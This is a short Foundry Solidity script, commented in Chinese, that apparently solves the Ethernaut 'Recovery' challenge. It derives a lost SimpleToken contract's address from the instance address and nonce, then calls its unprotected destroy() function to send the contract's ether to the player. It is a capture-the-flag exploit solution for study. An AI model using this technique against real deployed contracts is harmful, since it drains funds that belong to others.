// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/RecoverySolve.sol";

contract SolveRecovery is Script {
    function run() external {
        // 1. 設定你的實例地址與錢包
        address recoveryInstance = vm.envAddress("INSTANCE_ADDRESS");
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address myAddress = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        // 2. 計算 SimpleToken 的地址
        // RLP 編碼公式: keccak256(rlp([sender, nonce]))
        // 對於 nonce 1，編碼格式為: 0xd6, 0x94, <address>, 0x01
        address tokenAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            recoveryInstance,
            bytes1(0x01)
        )))));

        console.log("Calculated Token Address:", tokenAddress);

        // 3. 呼叫 destroy 函數，把錢轉回給你
        ISimpleToken(tokenAddress).destroy(payable(myAddress));

        vm.stopBroadcast();
        
        console.log("Success! Ether sent to:", myAddress);
    }
}
